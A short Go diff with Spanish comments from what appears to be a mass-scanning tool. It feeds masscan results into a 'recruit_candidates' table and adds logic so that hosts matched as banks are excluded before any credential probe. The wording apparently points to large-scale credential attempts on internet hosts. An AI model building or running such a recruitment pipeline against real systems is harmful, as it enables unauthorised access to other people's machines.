@@ -158,6 +158,15 @@ func ejecutarSweep(ctx context.Context, rutaJSON string, limit int, dryRun bool,
 			fmt.Printf("INSERT INTO recruit_candidates (ip,port,source,state) VALUES ('%s',%d,'masscan','eligible') ON CONFLICT (ip,port) DO NOTHING;\n", cand.IP, cand.Port)
 			continue
 		}
+		// Exclusion al nacer: un banco no gasta ni un SYN de credencial.
+		if motivo, err := st.Coincide(ctx, cand.IP, ""); err == nil && motivo != "" {
+			if id, err := st.CandidatoPorIP(ctx, cand.IP, cand.Port); err == nil {
+				if err := st.Excluir(ctx, id, motivo, "probe"); err != nil {
+					return err
+				}
+			}
+			continue
+		}
 		estado := "bannered"
 		if sinRespuesta[cand.IP] {
 			estado = "sweeping"
